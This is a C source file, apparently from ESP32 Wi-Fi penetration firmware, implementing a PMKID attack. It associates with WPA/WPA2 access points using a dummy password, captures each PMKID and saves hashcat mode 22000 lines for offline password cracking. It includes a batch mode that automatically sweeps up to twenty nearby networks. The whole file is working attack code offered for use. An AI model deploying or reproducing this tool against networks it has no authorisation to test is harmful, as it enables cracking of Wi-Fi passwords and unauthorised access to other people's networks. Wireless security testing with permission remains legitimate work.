/**
 * @file attack_pmkid.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-03
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements PMKID attack.
 *
 * @date Update 2023-05-07
 * @note Updated by Zheng Lin Lei
 * @note Github: https://github.com/ZhengLinLei
 * 
 * @see PMKID attack reference - https://hashcat.net/forum/thread-7717.html
 */

#include "attack_pmkid.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"
#include "pcap_serializer.h"
#include "sdkconfig.h"

static const char* TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;
static bool pmkid_handler_registered = false;

static const char *pcap_error_message(void)
{
    switch (pcap_serializer_get_state()) {
        case PCAP_STORAGE_FULL: return "抓包存储空间已满";
        case PCAP_STORAGE_MOUNT_ERROR: return "抓包存储分区无法挂载";
        case PCAP_STORAGE_IO_ERROR: return "PMKID 文件写入失败";
        default: return "PMKID 文件保存失败";
    }
}

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 * 
 * If DATA_FRAME_EVENT_PMKID is received from event pool, this function stops PMKID attack and serialize 
 * captured PMKIDs into status content.
 * 
 * @param args not used
 * @param event_base expects FRAME_ANALYZER_EVENTS
 * @param event_id expects DATA_FRAME_EVENT_PMKID
 * @param event_data expexcts pmkid_item_t *
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID...");
    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    if (pmkid_item_head == NULL) {
        ESP_LOGW(TAG, "PMKID event without any item");
        return;
    }

    /* Count nodes first; the list is built with head insertion. */
    unsigned pmkid_item_count = 0;
    for (pmkid_item_t *item = pmkid_item_head; item != NULL; item = item->next) {
        pmkid_item_count++;
    }

    // Result layout: [0..5] MAC_STA, [6..11] MAC_AP, [12] SSID length,
    // [13..] SSID, then PMKID * count.
    char *content = attack_alloc_result_content(6 + 6 + 1 + strlen((char *) ap_record->ssid) + (pmkid_item_count * 16));
    if (content == NULL) {
        /* free the list so the items do not leak when allocation failed */
        pmkid_item_t *item = pmkid_item_head;
        while (item != NULL) {
            pmkid_item_t *next = item->next;
            free(item);
            item = next;
        }
        attack_signal_storage_error("PMKID 结果内存不足");
        return;
    }
    /* Keep the head of the buffer: `content` is advanced while filling, but the
       hashcat line below needs the STA MAC stored at the very beginning. */
    char *const content_head = content;
    wifictl_get_sta_mac((uint8_t *) content);
    content += 6;
    memcpy(content, ap_record->bssid, 6);
    content += 6;
    content[0] = strlen((char *) ap_record->ssid);
    content += 1;
    strcpy(content, (char *) ap_record->ssid);
    content += strlen((char *) ap_record->ssid);

    // copy PMKIDs into continuous memory into "content" in status, freeing as we go,
    // and build a hashcat-ready line for each one so the result survives a reboot.
    char hashcat_line[256];
    bool saved = false;

    pmkid_item_t *item = pmkid_item_head;
    while (item != NULL) {
        pmkid_item_t *next = item->next;
        memcpy(content, item->pmkid, 16);
        content += 16;

        if (!saved) {
            char pmkid_hex[33];
            char ap_hex[13];
            char sta_hex[13];
            char essid_hex[2 * 32 + 1];
            for (unsigned i = 0; i < 16; i++) {
                snprintf(&pmkid_hex[i * 2], 3, "%02x", item->pmkid[i]);
            }
            pmkid_hex[32] = '\0';
            for (unsigned i = 0; i < 6; i++) {
                snprintf(&ap_hex[i * 2], 3, "%02x", ap_record->bssid[i]);
            }
            ap_hex[12] = '\0';
            const uint8_t *sta = (const uint8_t *) content_head;
            for (unsigned i = 0; i < 6; i++) {
                snprintf(&sta_hex[i * 2], 3, "%02x", sta[i]);
            }
            sta_hex[12] = '\0';

            /* hashcat mode 22000 uses the unified line
               WPA*01*PMKID*MAC_AP*MAC_STA*ESSID*** with the ESSID in hex.
               The previous 4-field line was the legacy -m 16800 layout (and
               even that one needed a hex ESSID), so it could not be fed to
               -m 22000 at all. */
            unsigned essid_len = strlen((char *) ap_record->ssid);
            if (essid_len > 32) essid_len = 32;
            for (unsigned i = 0; i < essid_len; i++) {
                snprintf(&essid_hex[i * 2], 3, "%02x", ap_record->ssid[i]);
            }
            essid_hex[essid_len * 2] = '\0';

            snprintf(hashcat_line, sizeof(hashcat_line), "WPA*01*%s*%s*%s*%s***",
                     pmkid_hex, ap_hex, sta_hex, essid_hex);

            if (pcap_serializer_write_text("pmkid", ap_record->ssid,
                                           essid_len, hashcat_line)) {
                saved = true;
            }
        }

        free(item);
        item = next;
    }

    if (saved) {
        /* Defer teardown: this callback runs on the sniffer event loop. */
        attack_signal_success();
    } else {
        attack_signal_storage_error(pcap_error_message());
    }
    ESP_LOGD(TAG, "PMKID attack finished");
}

/* ------------------------------------------------------------------ */
/* Batch sweep                                                         */
/* ------------------------------------------------------------------ */

/* The probe only needs M1: an AP answers an association request with M1 right
   away, and any PMKID it caches is in that frame's key data. Waiting for the
   connect to fail would cost 5-10 s per AP instead of ~1 s. */
#define PMKID_BATCH_MAX        20
#define PMKID_BATCH_PROBE_MS   1500
#define PMKID_BATCH_MIN_RSSI   (-85)

typedef enum {
    BATCH_PENDING = 0,
    BATCH_HIT,
    BATCH_MISS,
} batch_state_t;

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    int8_t rssi;
    uint8_t channel;
    wifi_auth_mode_t authmode;
    batch_state_t state;
} pmkid_batch_entry_t;

static pmkid_batch_entry_t batch_entries[PMKID_BATCH_MAX];
static volatile unsigned batch_total = 0;
static volatile unsigned batch_done = 0;
static volatile unsigned batch_hits = 0;
static volatile unsigned batch_current = 0;
static volatile bool batch_active = false;
static volatile bool batch_cancel = false;
static volatile bool batch_hit_seen = false;

void attack_pmkid_batch_progress(unsigned *done, unsigned *total, unsigned *hits)
{
    if (done) *done = batch_done;
    if (total) *total = batch_total;
    if (hits) *hits = batch_hits;
}

bool attack_pmkid_batch_active(void)
{
    return batch_active;
}

static void free_pmkid_list(pmkid_item_t *head)
{
    while (head != NULL) {
        pmkid_item_t *next = head->next;
        free(head);
        head = next;
    }
}

/** @brief Build a hashcat -m 22000 line: WPA*01*PMKID*AP*STA*ESSIDhex*** */
static bool pmkid_build_line(pmkid_item_t *item, const uint8_t *bssid,
                             const uint8_t *ssid, unsigned ssid_len,
                             char *out, size_t out_size)
{
    if (item == NULL || bssid == NULL || ssid == NULL || out == NULL) return false;

    char pmkid_hex[33];
    char ap_hex[13];
    char sta_hex[13];
    char essid_hex[2 * 32 + 1];
    uint8_t sta[6];

    for (unsigned i = 0; i < 16; i++) snprintf(&pmkid_hex[i * 2], 3, "%02x", item->pmkid[i]);
    pmkid_hex[32] = '\0';
    for (unsigned i = 0; i < 6; i++) snprintf(&ap_hex[i * 2], 3, "%02x", bssid[i]);
    ap_hex[12] = '\0';
    wifictl_get_sta_mac(sta);
    for (unsigned i = 0; i < 6; i++) snprintf(&sta_hex[i * 2], 3, "%02x", sta[i]);
    sta_hex[12] = '\0';
    if (ssid_len > 32) ssid_len = 32;
    for (unsigned i = 0; i < ssid_len; i++) snprintf(&essid_hex[i * 2], 3, "%02x", ssid[i]);
    essid_hex[ssid_len * 2] = '\0';

    int written = snprintf(out, out_size, "WPA*01*%s*%s*%s*%s***",
                           pmkid_hex, ap_hex, sta_hex, essid_hex);
    return written > 0 && (size_t) written < out_size;
}

static void pmkid_batch_handler(void *args, esp_event_base_t base, int32_t id, void *event_data)
{
    (void) args;
    (void) base;
    (void) id;

    pmkid_item_t *head = *(pmkid_item_t **) event_data;
    if (head == NULL) return;

    unsigned idx = batch_current;
    if (idx < batch_total) {
        pmkid_batch_entry_t *entry = &batch_entries[idx];
        unsigned ssid_len = strlen(entry->ssid);
        char line[192];
        if (pmkid_build_line(head, entry->bssid, (const uint8_t *) entry->ssid,
                             ssid_len, line, sizeof(line)) &&
            pcap_serializer_write_text("pmkid", (const uint8_t *) entry->ssid,
                                       ssid_len, line)) {
            batch_hit_seen = true;
        }
    }
    free_pmkid_list(head);
}

static bool pmkid_candidate_ok(const wifi_ap_record_t *rec)
{
    if (rec->primary < 1 || rec->primary > 13) return false;
    if (rec->rssi < PMKID_BATCH_MIN_RSSI) return false;
    if (rec->ssid[0] == '\0') return false;
    switch (rec->authmode) {
        case WIFI_AUTH_WPA_PSK:
        case WIFI_AUTH_WPA2_PSK:
        case WIFI_AUTH_WPA_WPA2_PSK:
        case WIFI_AUTH_WPA2_WPA3_PSK:
            return true;
        default:
            return false;
    }
}

static void pmkid_batch_task(void *arg)
{
    (void) arg;

    batch_total = 0;
    batch_done = 0;
    batch_hits = 0;
    batch_cancel = false;

    wifictl_ap_records_t records;
    if (!wifictl_copy_ap_records(&records)) {
        ESP_LOGE(TAG, "No scan results for the batch sweep");
        attack_update_status(FINISHED);
        batch_active = false;
        vTaskDelete(NULL);
        return;
    }

    for (unsigned i = 0; i < records.count && batch_total < PMKID_BATCH_MAX; i++) {
        const wifi_ap_record_t *rec = &records.records[i];
        if (!pmkid_candidate_ok(rec)) continue;
        pmkid_batch_entry_t *e = &batch_entries[batch_total];
        memcpy(e->bssid, rec->bssid, 6);
        memcpy(e->ssid, rec->ssid, sizeof(e->ssid));
        e->ssid[sizeof(e->ssid) - 1] = '\0';
        e->rssi = rec->rssi;
        e->channel = rec->primary;
        e->authmode = rec->authmode;
        e->state = BATCH_PENDING;
        batch_total++;
    }

    /* Strongest first: a closer AP is more likely to answer. */
    for (unsigned i = 1; i < batch_total; i++) {
        pmkid_batch_entry_t tmp = batch_entries[i];
        int j = (int) i - 1;
        while (j >= 0 && batch_entries[j].rssi < tmp.rssi) {
            batch_entries[j + 1] = batch_entries[j];
            j--;
        }
        batch_entries[j + 1] = tmp;
    }

    if (batch_total == 0) {
        ESP_LOGW(TAG, "No PMKID candidates in the scan result");
        attack_update_status(FINISHED);
        batch_active = false;
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "Batch PMKID: probing %u AP(s)", batch_total);

    esp_event_loop_handle_t loop = wifictl_sniffer_event_loop();
    if (loop == NULL ||
        esp_event_handler_register_with(loop, FRAME_ANALYZER_EVENTS,
                                        DATA_FRAME_EVENT_PMKID,
                                        &pmkid_batch_handler, NULL) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to register the batch PMKID handler");
        attack_signal_storage_error("PMKID 处理器注册失败");
        batch_active = false;
        vTaskDelete(NULL);
        return;
    }

    for (unsigned i = 0; i < batch_total && !batch_cancel; i++) {
        pmkid_batch_entry_t *e = &batch_entries[i];
        batch_current = i;
        batch_hit_seen = false;

        wifi_ap_record_t ap;
        memset(&ap, 0, sizeof(ap));
        memcpy(ap.bssid, e->bssid, 6);
        memcpy(ap.ssid, e->ssid, sizeof(ap.ssid));
        ap.primary = e->channel;
        ap.authmode = e->authmode;

        wifictl_sniffer_filter_frame_types(true, false, false);
        wifictl_set_channel(e->channel);
        wifictl_sniffer_start(e->channel);
        frame_analyzer_capture_start(SEARCH_PMKID, e->bssid);
        wifictl_sta_connect_to_ap(&ap, "dummypassword");

        for (unsigned waited = 0;
             waited < PMKID_BATCH_PROBE_MS && !batch_hit_seen && !batch_cancel;
             waited += 50) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }

        wifictl_sta_disconnect();
        frame_analyzer_capture_stop();
        wifictl_sniffer_stop();

        e->state = batch_hit_seen ? BATCH_HIT : BATCH_MISS;
        if (batch_hit_seen) batch_hits++;
        batch_done = i + 1;
        ESP_LOGI(TAG, "[%u/%u] %s: %s", batch_done, batch_total,
                 e->ssid[0] ? e->ssid : "(hidden)",
                 e->state == BATCH_HIT ? "PMKID" : "-");
    }

    esp_event_handler_unregister_with(loop, FRAME_ANALYZER_EVENTS,
                                      DATA_FRAME_EVENT_PMKID, &pmkid_batch_handler);

    /* Summary next to the captures so the sweep can be reviewed later. */
    char summary[PMKID_BATCH_MAX * 48 + 64];
    int len = snprintf(summary, sizeof(summary), "PMKID batch: %u/%u probed, %u hit\n",
                       batch_done, batch_total, batch_hits);
    for (unsigned i = 0; i < batch_done && len > 0 && (size_t) len < sizeof(summary); i++) {
        int n = snprintf(summary + len, sizeof(summary) - (size_t) len, "%-32s %s\n",
                         batch_entries[i].ssid[0] ? batch_entries[i].ssid : "(hidden)",
                         batch_entries[i].state == BATCH_HIT ? "PMKID" : "-");
        if (n < 0) break;
        len += n;
    }
    if (len > 0) {
        pcap_serializer_write_text("pmkid_batch", NULL, 0, summary);
    }

    wifictl_move_mgmt_ap_to_channel(CONFIG_MGMT_AP_CHANNEL);
    wifictl_mgmt_ap_start();

    ESP_LOGI(TAG, "Batch PMKID finished: %u/%u hit", batch_hits, batch_total);
    attack_update_status(FINISHED);
    batch_active = false;
    vTaskDelete(NULL);
}

void attack_pmkid_start(attack_config_t *attack_config){
    ESP_LOGI(TAG, "Starting PMKID attack...");
    batch_total = 0;
    if (attack_config->method == ATTACK_PMKID_METHOD_BATCH) {
        ESP_LOGI(TAG, "Starting batch PMKID sweep...");
        batch_active = true;
        if (xTaskCreate(pmkid_batch_task, "pmkid_batch", 6144, NULL, 5, NULL) != pdPASS) {
            ESP_LOGE(TAG, "Failed to start the batch PMKID task");
            batch_active = false;
            attack_update_status(FINISHED);
        }
        return;
    }
    ap_record = attack_config->ap_record;
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);
    wifictl_sta_connect_to_ap(ap_record, "dummypassword");

    esp_err_t err = esp_event_handler_register_with(wifictl_sniffer_event_loop(),
                                                    FRAME_ANALYZER_EVENTS,
                                                    DATA_FRAME_EVENT_PMKID,
                                                    &pmkid_exit_condition_handler, NULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to register PMKID handler: %s", esp_err_to_name(err));
        attack_signal_storage_error("PMKID 处理器注册失败");
        return;
    }
    pmkid_handler_registered = true;
}

void attack_pmkid_stop(){
    /* A running batch owns the sniffer and the AP state; ask it to unwind
       instead of tearing the radio down under it. */
    if (batch_active) {
        batch_cancel = true;
        return;
    }
    wifictl_sta_disconnect();
    wifictl_sniffer_stop();
    frame_analyzer_capture_stop();
    /* Unregistering a handler that is not registered (or already gone) is not
       fatal: it must never abort() the device while stopping an attack. */
    if (pmkid_handler_registered) {
        esp_err_t err = esp_event_handler_unregister_with(wifictl_sniffer_event_loop(),
                                                         FRAME_ANALYZER_EVENTS,
                                                         DATA_FRAME_EVENT_PMKID,
                                                         &pmkid_exit_condition_handler);
        if (err != ESP_OK && err != ESP_ERR_NOT_FOUND) {
            ESP_LOGW(TAG, "Failed to unregister PMKID handler: %s", esp_err_to_name(err));
        }
        pmkid_handler_registered = false;
    }
    ESP_LOGD(TAG, "PMKID attack stopped");
}
